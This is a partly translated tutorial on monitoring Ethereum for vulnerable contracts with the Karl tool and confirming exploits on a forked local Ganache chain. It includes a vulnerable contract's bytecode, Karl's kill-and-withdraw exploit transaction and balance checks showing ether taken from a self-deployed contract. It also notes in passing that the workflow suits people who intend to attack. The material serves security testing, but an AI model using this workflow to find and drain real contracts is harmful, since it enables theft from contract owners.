用于检查安全漏洞的智能合约的监视器。
当监视以太坊区块链中的脆弱合同时，需要一种方法来确定我发现的漏洞是真实的还是仅仅是散布的误报和蜜罐。通过测试区块链虚拟副本中的漏洞，已经能够缓解这种可能性。
（_蜜罐_**_技术本质上时一种对攻击方进行欺骗的技术，通过布置一些作为诱饵的主机_**_。_）
### Virtual environment
A blockchain clone is useful because we could break the contract arbitrarily sending transactions to it. Remember[“I accidentally killed it”](https://github.com/paritytech/parity-ethereum/issues/6995)?
Another great reason to use a virtual environment is that once you send transactions to the blockchain, any other person watching it will know how to exploit it, and they may not be as diligent as you about[responsibly disclosing the vulnerability](https://en.wikipedia.org/wiki/Responsible_disclosure)to the creators of the application.
Even if you wanted to exploit the contract, you would still need to make sure the exploit works by testing it before carrying out the attack.
### 如何设置虚拟环境
[Ganache](https://truffleframework.com/ganache)是按需个人以太坊区块链，非常适合本地开发……和黑客入侵
与[Geth](https://github.com/ethereum/go-ethereum)或[Parity](https://github.com/paritytech/parity-ethereum)相比，Ganache易于设置，并且不[占用](https://github.com/ethereum/go-ethereum)大量资源。
只需2个命令即可安装和运行Ganache（如果已安装[Node.js](https://nodejs.org/)）
```markdown
$ npm install -g ganache-cli
$ ganache-cli
```
### 分叉主网
Ganache的一个鲜为人知的功能是**分叉**另一个区块链。可以将其视为**克隆现有的区块链**，但是不用担心，无需下载整个区块链！Ganache将立即启动，并且仅在需要时才查询真实的区块链，例如读取合同的代码和状态。
```markdown
$ ganache-cli -f https://mainnet.infura.io
```
并且，如果需要，可以将链分叉到特定的块，例如在块100进行分叉。
```markdown
$ ganache-cli -f https://mainnet.infura.io@100
```
这将提供一个可以安全使用的**区块链克隆**。它将创建一个本地实例，可以发送交易和部署新合同，运行漏洞利用程序并检查其有效性。所有这些都无需触及_真正的区块链_，也不会让其他人知道我们在做什么，也不会错误地自毁库。
## 测试
## 在以下示例中，我们将：

- 运行Karl并监视易受攻击的合同
- 找到脆弱的合同后分叉链
- 测试漏洞利用，看看我们是否偷走了一些以太币
### Karl
If you don’t know about Karl, go to the GitHub page and star the project. It helps you find vulnerable contracts on Ethereum.
[https://github.com/cleanunicorn/karl](https://github.com/cleanunicorn/karl)
_If you find any bugs or have any problems running Karl, please_[report an issue](https://github.com/cleanunicorn/karl/issues)_._
Karl is available as a[PyPI package](https://pypi.org/project/karl/), so you can just install it by running:
```markdown
$ pip install --user karl
```
然后与以太坊节点进行连接
![image.png](https://images.cherryfloris.eu.org/2021/1620577914716-939dcd9e-6afa-4bb5-9afe-974de021b920.png)
我们通常会将Karl指向主要的以太坊网络，并监视在那里部署的合同。现在改为监视本地测试链。我们还将在该测试链中使用Ganache。
我们启动一个私有Ganache实例。
```markdown
$ ganache-cli -d
```
![image.png](https://images.cherryfloris.eu.org/2021/1620577421256-28d9ff9d-f04c-41f3-8e15-8cdc99609612.png)此处要注意路径
启动Karl并监视新合同。（开启一个新的终端）
```markdown
$ karl --rpc localhost:8545
```
![image.png](https://images.cherryfloris.eu.org/2021/1620578203750-87fffb0d-ea37-48ae-a2f1-a02912fb8133.png)
在Ganache控制台中，我们将看到Karl轮询新块，等待部署新合同。
```markdown
Listening on 127.0.0.1:8545
eth_blockNumber
eth_getBlockByNumber
eth_getBlockByNumber
eth_getBlockByNumber
eth_getBlockByNumber
eth_getBlockByNumber
...
```
![image.png](https://images.cherryfloris.eu.org/2021/1620578510474-ea4cf9dc-e5e4-4069-9a47-fba454df8639.png)
我们将自己部署一个易受攻击的合同。
该curl请求与1个ether一起部署了一个易受攻击的合同。
```markdown
curl -X POST -d '{"id": 1, "jsonrpc": "2.0", "method": "eth_sendTransaction", "params": [{"from": "0xaca94ef8bd5ffee41947b4585a84bda5a3d3da6e", "gas": "300000", "value": "0xde0b6b3a7640000",  "data": "0x608060405260c0806100126000396000f3fe6080604052348015600f57600080fd5b50600436106044577c01000000000000000000000000000000000000000000000000000000006000350463cbf0b0c081146049575b600080fd5b607960048036036020811015605d57600080fd5b503573ffffffffffffffffffffffffffffffffffffffff16607b565b005b8073ffffffffffffffffffffffffffffffffffffffff16fffea165627a7a72305820ddb174c0ae06fce4c792c57814a3c70d932e0ae31a6a3560c4ca0bb7be11bc370029"}]}' localhost:8545
```
Karl应该立即发现一个漏洞。
```markdown
POSSIBLE VULNERABILITY!
Initial balance = 100000000000000000000, final balance = 101999999999999985722

Type = VulnerabilityType.KILL_AND_WITHDRAW
Description = Looks line anyone can kill this contract and steal its balance.
Transactions = [{'from': '0x1dF62f291b2E969fB0849d99D9Ce41e2F137006e', 'to': '0x07a457d878BF363E0Bb5aa0B096092f941e19962', 'data': '0xcbf0b0c0bebebebebebebebebebebebe1dF62f291b2E969fB0849d99D9Ce41e2F137006e', 'value': 0}]
```
![image.png](https://images.cherryfloris.eu.org/2021/1620578758703-580eb33d-fed6-4f58-b601-ae163ec41044.png)![image.png](https://images.cherryfloris.eu.org/2021/1620578612509-5eb1dd39-cf44-41eb-a78e-941e23b93714.png)
现在，我们可以分叉链并亲自检查漏洞。
### 分叉链
原始链位于http://localhost:8545，因为我们是在同一台机器上运行它，所以我们可以使用fork功能启动Ganache，并在其他端口上启动它。
```markdown
ganache-cli -f http://localhost:8545 -d -p 9545
```
![image.png](https://images.cherryfloris.eu.org/2021/1620578984106-7563895a-a48a-484d-acdb-6cb1555e26df.png)
每个标志说明：

- -f http://localhost:8545告诉Ganache叉什么链
- -d以确定性模式运行Ganache，每次都会生成相同的钱包；这很重要，因为我们可以复制粘贴curl命令，而无需更新部署合同的地址
- -p 9545设置要在其上运行的其他端口（我们的测试链已使用默认的8545）

一旦分叉启动并运行，我们就可以发送Karl报告的交易，看看我们是否成功偷走了合约的以太币。
首先检查将利用漏洞合同的地址的初始余额0x1dF62f291b2E969fB0849d99D9Ce41e2F137006e。
```markdown
 curl -X POST -d '{"id": 1, "method": "eth_getBalance", "params":["0x1dF62f291b2E969fB0849d99D9Ce41e2F137006e"]}' localhost:9545

{"id":1,"result":"0x56bc75e2d63100000"}
```
![image.png](https://images.cherryfloris.eu.org/2021/1620579328421-71c051af-c834-4f74-8c9d-2119b13f5173.png)
我们在结果中看到交易哈希成功的响应。
### 检查最终余额
最后要做的是获取帐户的最终余额。
```markdown
curl -X POST -d '{"id": 1, "method": "eth_getBalance", "params":["0x1dF62f291b2E969fB0849d99D9Ce41e2F137006e"]}' localhost:9545

{"id":1,"result":"0x579a71129ec175000"}
```
![image.png](https://images.cherryfloris.eu.org/2021/1620579179963-9ddb898d-82c1-4a02-867c-69ea85601f35.png)
通过数学计算，我们发现差额几乎是1个以太币，即部署时在合约中发送的初始以太币，减去了利用时的交易费。
![image.png](https://images.cherryfloris.eu.org/2021/1620579395583-3b9563b6-77e7-4792-8e46-aa2239f38b09.png)
